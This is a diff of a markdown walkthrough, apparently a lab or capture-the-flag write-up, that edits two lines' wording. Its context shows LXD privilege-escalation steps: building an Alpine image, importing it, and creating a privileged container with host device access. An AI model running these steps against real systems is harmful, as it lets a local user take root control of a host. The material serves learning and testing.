@@ -51,7 +51,7 @@ uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip
 └─$ ls
 alpine-v3.13-x86_64-20210218_0139.tar.gz  build-alpine  LICENSE  README.md
 ```
-6. Now we have to build it with i686 architecture
+6. Now we have to build it (I chose i686 architecture to be safe but it probably should work with x86, just build without -a)
 ```shell
 └─$ sudo ./build-alpine -a i686
 └─$ ls
@@ -64,7 +64,7 @@ john@exploitable:~$ lxc image import alpine-v3.19-i686-20240410_2128.tar.gz --al
 Image imported with fingerprint: 9040fc16bbd675e014c9bfe0bcad601e2b8f54e93a1c109d912fc829030d1f5b
 ```
 8. You can check the image specifications like architecture and size with `lxc image list`
-9. Now we just create the instance as privileged, add access to te host device, and launch
+9. Now we just create the instance as privileged, add access to the host device, and launch
 ```shell
 john@exploitable:~$ lxc init alpine gameserv -c security.privileged=true
 Creating gameserv
